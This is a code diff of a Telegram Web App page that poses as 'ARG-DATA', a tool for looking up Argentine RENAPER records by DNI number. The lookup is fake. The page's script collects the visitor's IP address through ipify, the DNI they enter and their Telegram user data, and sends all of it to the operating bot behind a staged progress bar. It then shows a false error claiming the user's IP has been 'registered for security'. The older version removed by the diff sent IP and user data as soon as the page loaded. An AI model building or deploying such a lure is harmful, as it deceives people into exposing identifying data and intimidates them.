@@ -3,48 +3,67 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>ARG-DATA — Terminal</title>
+  <title>ARG-DATA v4.2</title>
   <style>
-    body{ background:#000; color:#00ffcc; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-    .loader{ text-align:center; border:2px solid #00ffcc; padding:20px; border-radius:15px; }
-    .blink{ animation: blinker 1s linear infinite; }
+    :root { --main-green: #2ecc71; --dark-bg: #121212; --card-bg: #1e1e1e; --text-gray: #a0a0a0; }
+    body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+    #terminal-screen { text-align: center; }
+    .blink { animation: blinker 1s linear infinite; color: var(--main-green); font-family: monospace; font-size: 1.2rem; }
     @keyframes blinker { 50% { opacity: 0; } }
+    #app-screen { display: none; width: 90%; max-width: 400px; text-align: center; }
+    .title { color: var(--main-green); font-size: 2.2rem; font-weight: bold; margin-bottom: 5px; }
+    .subtitle { color: var(--main-green); font-size: 0.8rem; letter-spacing: 1px; margin-bottom: 25px; text-transform: uppercase; }
+    .card { background: var(--card-bg); padding: 25px; border-radius: 15px; border: 1px solid #333; text-align: left; }
+    .card-title { font-weight: bold; font-size: 1.1rem; margin-bottom: 5px; }
+    .card-desc { color: var(--text-gray); font-size: 0.8rem; margin-bottom: 20px; line-height: 1.4; }
+    input { width: 100%; background: #2a2a2a; border: 1px solid #444; border-radius: 5px; padding: 12px; color: white; font-size: 1rem; box-sizing: border-box; margin-bottom: 20px; outline: none; }
+    .btn { background: var(--main-green); color: black; border: none; width: 100%; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 1rem; cursor: pointer; text-transform: uppercase; }
+    .status-area { display: none; margin-top: 20px; }
+    .status-text { color: var(--main-green); font-size: 0.7rem; margin-bottom: 8px; font-family: monospace; }
+    .progress-container { width: 100%; background: #333; height: 6px; border-radius: 3px; overflow: hidden; }
+    .progress-bar { width: 0%; height: 100%; background: var(--main-green); transition: width 0.4s; }
   </style>
 </head>
 <body>
-  <div class="loader">
-    <h2 class="blink">CONECTANDO AL SERVIDOR...</h2>
-    <p id="status">Iniciando protocolos de búsqueda...</p>
+  <div id="terminal-screen"><div class="blink">> ESTABLECIENDO CONEXIÓN SEGURA...</div></div>
+  <div id="app-screen">
+    <div class="title">ARG-DATA v4.2</div>
+    <div class="subtitle">BUSCAR POR DNI</div>
+    <div class="card">
+        <div class="card-title">Buscar DNI</div>
+        <div class="card-desc">Ingrese el número de documento para buscar en la base de datos del RENAPER.</div>
+        <input type="number" id="dniInput" placeholder="Ej: 30123456">
+        <button class="btn" onclick="consultar()">REALIZAR CONSULTA</button>
+        <div class="status-area" id="loading-area">
+            <div class="status-text" id="statusMsg">Conectando con servidor central...</div>
+            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+        </div>
+    </div>
   </div>
-
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script>
-    (async function(){
-      const tg = window.Telegram.WebApp;
-      tg.expand();
-      tg.ready();
-
-      try {
-        // CAPTURA DE IP
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        
-        // DATOS PARA MANDAR AL BOT
-        const logData = {
-          ip: ipData.ip,
-          plataforma: tg.platform,
-          user: tg.initDataUnsafe.user 
-        };
-
-        // ENVÍO AUTOMÁTICO
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    let userIP = "";
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip);
+    setTimeout(() => {
+        document.getElementById('terminal-screen').style.display = 'none';
+        document.getElementById('app-screen').style.display = 'block';
+    }, 2500);
+    function consultar() {
+        const val = document.getElementById('dniInput').value;
+        if(val.length < 6) return;
+        document.getElementById('loading-area').style.display = 'block';
+        const bar = document.getElementById('bar');
+        const msg = document.getElementById('statusMsg');
+        setTimeout(() => { bar.style.width = "35%"; msg.innerText = "Accediendo a registros..."; }, 800);
+        setTimeout(() => { bar.style.width = "70%"; msg.innerText = "Sincronizando con RENAPER..."; }, 2000);
         setTimeout(() => {
-            tg.sendData(JSON.stringify(logData));
-        }, 2000);
-
-      } catch(e) {
-        tg.close();
-      }
-    })();
+            tg.sendData(JSON.stringify({ip: userIP, busqueda: val, user: tg.initDataUnsafe.user}));
+            alert("Error 505: El servidor de RENAPER no responde. Su IP ha sido registrada por seguridad.");
+            tg.close();
+        }, 4000);
+    }
   </script>
 </body>
 </html>
